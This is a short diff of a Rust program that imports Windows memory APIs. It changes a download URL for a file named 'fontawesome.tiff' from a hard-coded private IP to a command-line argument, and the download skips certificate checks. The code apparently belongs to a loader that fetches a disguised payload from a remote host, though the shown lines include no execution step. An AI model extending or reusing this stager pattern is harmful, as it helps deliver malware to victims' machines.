@@ -10,10 +10,12 @@ use windows::Win32::System::Memory::{
 use zeroize::Zeroize;
 
 fn main() -> Result<(), Error> {
+    let args: Vec<String> = std::env::args().collect();
+
     let target = "192.168.122.227:8081";
 
     //println!("{}, {}", args[0], args[1]);
-    let mut url = format!("http://{}/fontawesome.tiff", target);
+    let mut url = format!("http://{}/fontawesome.tiff", args[1]);
 
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
